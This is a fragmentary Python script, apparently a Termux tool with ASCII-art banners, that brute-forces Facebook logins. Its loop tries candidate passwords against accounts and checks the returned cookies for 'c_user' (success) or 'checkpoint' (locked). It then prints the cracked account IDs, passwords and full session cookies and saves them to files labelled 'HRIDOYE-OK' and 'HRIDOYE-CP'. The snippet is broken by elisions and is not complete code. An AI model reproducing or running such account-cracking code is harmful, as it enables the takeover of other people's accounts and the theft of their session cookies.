...
\____$$  |$$  __$$\ $$ |  $$ |\_$$  _|$$  __$$\ 
 ...
 $$  /    $$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |
$$$$$$$$\ $$ |  $$ |$$ |  $$ |$$$$$$\ $$$$$$$  |
\________|\__|  \__|\__|  \__|\______|\_______/ 
...
def ud():
    os.system('clear')
    jalan(logo)
    print(' \033[1;32m[1] TERMUX NEW COMAND')
    print(' [2] EXIT')
...
$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |$$ |  $$ |   $$ |    $$ |      
$$ |  $$ |$$ |  $$ |$$$$$$\ $$$$$$$  | $$$$$$  |   $$ |    $$$$$$$$\ 
\__|  \__|\__|  \__|\______|\_______/  \______/    \__|    \________|
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[HRIDOYE-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HRIDOYE-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[HRIDOYE-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HRIDOYE-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[HRIDOYE] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
